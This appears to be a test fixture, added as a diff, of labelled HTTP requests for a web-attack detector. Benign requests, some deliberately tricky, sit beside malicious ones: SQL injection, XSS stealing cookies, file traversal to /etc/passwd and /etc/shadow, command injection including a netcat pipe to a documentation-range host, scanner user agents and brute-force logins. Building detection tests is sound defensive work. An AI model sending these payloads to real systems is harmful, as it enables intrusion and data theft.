@@ -1,0 +1,1085 @@
+[
+  {
+    "id": "B01",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.1",
+    "method": "GET",
+    "path": "/index.html",
+    "query": "",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440801.0,
+    "note": ""
+  },
+  {
+    "id": "B02",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.2",
+    "method": "GET",
+    "path": "/products",
+    "query": "id=42&sort=price",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440803.0,
+    "note": ""
+  },
+  {
+    "id": "B03",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.3",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=blue+running+shoes",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440805.0,
+    "note": ""
+  },
+  {
+    "id": "B04",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.4",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=alice&password=Secret123",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440807.0,
+    "note": ""
+  },
+  {
+    "id": "B05",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.5",
+    "method": "GET",
+    "path": "/blog",
+    "query": "title=rock+and+roll+history",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440809.0,
+    "note": ""
+  },
+  {
+    "id": "B06",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.6",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=select+a+seat+for+the+show",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440811.0,
+    "note": ""
+  },
+  {
+    "id": "B07",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.7",
+    "method": "POST",
+    "path": "/comment",
+    "query": "",
+    "body": "text=I+love+this+article%21+Thanks",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440813.0,
+    "note": ""
+  },
+  {
+    "id": "B08",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.8",
+    "method": "GET",
+    "path": "/api/users/15",
+    "query": "",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440815.0,
+    "note": ""
+  },
+  {
+    "id": "B09",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.9",
+    "method": "GET",
+    "path": "/about",
+    "query": "",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440817.0,
+    "note": ""
+  },
+  {
+    "id": "B10",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.10",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=O%27Brien+bakery",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440819.0,
+    "note": ""
+  },
+  {
+    "id": "B11",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.11",
+    "method": "GET",
+    "path": "/docs",
+    "query": "file=readme.txt",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440821.0,
+    "note": ""
+  },
+  {
+    "id": "B12",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.12",
+    "method": "POST",
+    "path": "/feedback",
+    "query": "",
+    "body": "message=Union+members+will+vote+next+week",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440823.0,
+    "note": ""
+  },
+  {
+    "id": "B13",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.13",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=trade+union+select+committee+elections",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440825.0,
+    "note": "legitimate text that contains the words 'union select'"
+  },
+  {
+    "id": "B14",
+    "label": "benign",
+    "category": "normal",
+    "ip": "198.51.100.14",
+    "method": "POST",
+    "path": "/comment",
+    "query": "",
+    "body": "text=I+use+the+%3Cscript%3E+tag+in+my+HTML+lessons",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440827.0,
+    "note": "legitimate text that mentions a script tag"
+  },
+  {
+    "id": "M01",
+    "label": "malicious",
+    "category": "sqli",
+    "ip": "203.0.113.1",
+    "method": "GET",
+    "path": "/products",
+    "query": "id=1' OR '1'='1",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440832.0,
+    "note": ""
+  },
+  {
+    "id": "M02",
+    "label": "malicious",
+    "category": "sqli",
+    "ip": "203.0.113.2",
+    "method": "GET",
+    "path": "/products",
+    "query": "id=1 UNION SELECT username,password FROM users--",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440834.0,
+    "note": ""
+  },
+  {
+    "id": "M03",
+    "label": "malicious",
+    "category": "sqli",
+    "ip": "203.0.113.3",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin'--&password=x",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440836.0,
+    "note": ""
+  },
+  {
+    "id": "M04",
+    "label": "malicious",
+    "category": "sqli",
+    "ip": "203.0.113.4",
+    "method": "GET",
+    "path": "/products",
+    "query": "id=1;DROP TABLE users",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440838.0,
+    "note": ""
+  },
+  {
+    "id": "M05",
+    "label": "malicious",
+    "category": "sqli",
+    "ip": "203.0.113.5",
+    "method": "GET",
+    "path": "/products",
+    "query": "id=1%20AND%20SLEEP(5)",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440840.0,
+    "note": ""
+  },
+  {
+    "id": "M06",
+    "label": "malicious",
+    "category": "sqli",
+    "ip": "203.0.113.6",
+    "method": "GET",
+    "path": "/products",
+    "query": "id=1%2527%2520OR%2520%25271%2527%253D%25271",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440842.0,
+    "note": "double URL-encoded"
+  },
+  {
+    "id": "M07",
+    "label": "malicious",
+    "category": "sqli",
+    "ip": "203.0.113.7",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=1 UNION/**/SELECT/**/null,null",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440844.0,
+    "note": "inline comments instead of spaces"
+  },
+  {
+    "id": "M08",
+    "label": "malicious",
+    "category": "xss",
+    "ip": "203.0.113.8",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=<script>alert(1)</script>",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440846.0,
+    "note": ""
+  },
+  {
+    "id": "M09",
+    "label": "malicious",
+    "category": "xss",
+    "ip": "203.0.113.9",
+    "method": "POST",
+    "path": "/comment",
+    "query": "",
+    "body": "text=<img src=x onerror=alert(1)>",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440848.0,
+    "note": ""
+  },
+  {
+    "id": "M10",
+    "label": "malicious",
+    "category": "xss",
+    "ip": "203.0.113.10",
+    "method": "GET",
+    "path": "/redirect",
+    "query": "url=javascript:alert(document.cookie)",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440850.0,
+    "note": ""
+  },
+  {
+    "id": "M11",
+    "label": "malicious",
+    "category": "xss",
+    "ip": "203.0.113.11",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=%3Cscript%3Ealert(1)%3C/script%3E",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440852.0,
+    "note": "URL-encoded"
+  },
+  {
+    "id": "M12",
+    "label": "malicious",
+    "category": "xss",
+    "ip": "203.0.113.12",
+    "method": "GET",
+    "path": "/index.html",
+    "query": "",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Referer": "<script>alert(1)</script>"
+    },
+    "ts": 1793440854.0,
+    "note": "payload in a header"
+  },
+  {
+    "id": "M13",
+    "label": "malicious",
+    "category": "lfi",
+    "ip": "203.0.113.13",
+    "method": "GET",
+    "path": "/view",
+    "query": "page=/etc/passwd",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440856.0,
+    "note": ""
+  },
+  {
+    "id": "M14",
+    "label": "malicious",
+    "category": "lfi",
+    "ip": "203.0.113.14",
+    "method": "GET",
+    "path": "/view",
+    "query": "page=php://filter/convert.base64-encode/resource=index.php",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440858.0,
+    "note": ""
+  },
+  {
+    "id": "M15",
+    "label": "malicious",
+    "category": "lfi",
+    "ip": "203.0.113.15",
+    "method": "GET",
+    "path": "/download",
+    "query": "file=....//....//etc/passwd",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440860.0,
+    "note": "nested traversal"
+  },
+  {
+    "id": "M16",
+    "label": "malicious",
+    "category": "traversal",
+    "ip": "203.0.113.16",
+    "method": "GET",
+    "path": "/download",
+    "query": "file=../../../../windows/win.ini",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440862.0,
+    "note": ""
+  },
+  {
+    "id": "M17",
+    "label": "malicious",
+    "category": "traversal",
+    "ip": "203.0.113.17",
+    "method": "GET",
+    "path": "/static/..%2f..%2fetc%2fshadow",
+    "query": "",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440864.0,
+    "note": "encoded slashes in the path"
+  },
+  {
+    "id": "M18",
+    "label": "malicious",
+    "category": "traversal",
+    "ip": "203.0.113.18",
+    "method": "GET",
+    "path": "/files",
+    "query": "name=..\\..\\boot.ini",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440866.0,
+    "note": ""
+  },
+  {
+    "id": "M19",
+    "label": "malicious",
+    "category": "cmdi",
+    "ip": "203.0.113.19",
+    "method": "GET",
+    "path": "/ping",
+    "query": "host=8.8.8.8;cat /etc/passwd",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440868.0,
+    "note": ""
+  },
+  {
+    "id": "M20",
+    "label": "malicious",
+    "category": "cmdi",
+    "ip": "203.0.113.20",
+    "method": "GET",
+    "path": "/ping",
+    "query": "host=8.8.8.8 && whoami",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440870.0,
+    "note": ""
+  },
+  {
+    "id": "M21",
+    "label": "malicious",
+    "category": "cmdi",
+    "ip": "203.0.113.21",
+    "method": "GET",
+    "path": "/ping",
+    "query": "host=$(id)",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440872.0,
+    "note": ""
+  },
+  {
+    "id": "M22",
+    "label": "malicious",
+    "category": "cmdi",
+    "ip": "203.0.113.22",
+    "method": "POST",
+    "path": "/tools",
+    "query": "",
+    "body": "cmd=ls | nc 203.0.113.9 4444",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440874.0,
+    "note": ""
+  },
+  {
+    "id": "M23",
+    "label": "malicious",
+    "category": "scanner",
+    "ip": "203.0.113.23",
+    "method": "GET",
+    "path": "/index.html",
+    "query": "",
+    "body": "",
+    "headers": {
+      "User-Agent": "sqlmap/1.7"
+    },
+    "ts": 1793440876.0,
+    "note": "scanner user agent only"
+  },
+  {
+    "id": "M24",
+    "label": "malicious",
+    "category": "scanner",
+    "ip": "203.0.113.24",
+    "method": "GET",
+    "path": "/admin",
+    "query": "",
+    "body": "",
+    "headers": {
+      "User-Agent": "Nikto/2.5"
+    },
+    "ts": 1793440878.0,
+    "note": "scanner user agent only"
+  },
+  {
+    "id": "M25",
+    "label": "malicious",
+    "category": "xss",
+    "ip": "203.0.113.25",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440880.0,
+    "note": "base64 of a script tag"
+  },
+  {
+    "id": "M26",
+    "label": "malicious",
+    "category": "sqli",
+    "ip": "203.0.113.26",
+    "method": "GET",
+    "path": "/products",
+    "query": "id=1 AND ASCII(SUBSTRING(@@version,1,1))>50",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440882.0,
+    "note": "blind SQL injection with no tautology"
+  },
+  {
+    "id": "BF01",
+    "label": "benign",
+    "category": "normal",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess1",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440920.0,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF02",
+    "label": "benign",
+    "category": "normal",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess2",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440920.2,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF03",
+    "label": "benign",
+    "category": "normal",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess3",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440920.4,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF04",
+    "label": "benign",
+    "category": "normal",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess4",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440920.6,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF05",
+    "label": "benign",
+    "category": "normal",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess5",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440920.8,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF06",
+    "label": "benign",
+    "category": "normal",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess6",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440921.0,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF07",
+    "label": "benign",
+    "category": "normal",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess7",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440921.2,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF08",
+    "label": "benign",
+    "category": "normal",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess8",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440921.4,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF09",
+    "label": "benign",
+    "category": "normal",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess9",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440921.6,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF10",
+    "label": "benign",
+    "category": "normal",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess10",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440921.8,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF11",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess11",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440922.0,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF12",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess12",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440922.2,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF13",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess13",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440922.4,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF14",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess14",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440922.6,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF15",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess15",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440922.8,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF16",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess16",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440923.0,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF17",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess17",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440923.2,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF18",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess18",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440923.4,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF19",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess19",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440923.6,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF20",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess20",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440923.8,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF21",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess21",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440924.0,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF22",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess22",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440924.2,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF23",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess23",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440924.4,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF24",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess24",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440924.6,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "BF25",
+    "label": "malicious",
+    "category": "bruteforce",
+    "ip": "203.0.113.250",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin&password=guess25",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "ts": 1793440924.8,
+    "note": "brute-force login attempt"
+  },
+  {
+    "id": "RA01",
+    "label": "malicious",
+    "category": "sqli",
+    "ip": "203.0.113.99",
+    "method": "GET",
+    "path": "/products",
+    "query": "id=1' OR '1'='1",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440950.0,
+    "note": "repeat attacker"
+  },
+  {
+    "id": "RA02",
+    "label": "malicious",
+    "category": "xss",
+    "ip": "203.0.113.99",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=<script>alert(1)</script>",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440951.0,
+    "note": "repeat attacker"
+  },
+  {
+    "id": "RA03",
+    "label": "malicious",
+    "category": "lfi",
+    "ip": "203.0.113.99",
+    "method": "GET",
+    "path": "/view",
+    "query": "page=/etc/passwd",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440952.0,
+    "note": "repeat attacker"
+  },
+  {
+    "id": "RA04",
+    "label": "malicious",
+    "category": "cmdi",
+    "ip": "203.0.113.99",
+    "method": "GET",
+    "path": "/ping",
+    "query": "host=1.1.1.1;whoami",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440953.0,
+    "note": "repeat attacker"
+  },
+  {
+    "id": "RA05",
+    "label": "malicious",
+    "category": "traversal",
+    "ip": "203.0.113.99",
+    "method": "GET",
+    "path": "/download",
+    "query": "file=../../secret.txt",
+    "body": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ts": 1793440954.0,
+    "note": "repeat attacker"
+  }
+]
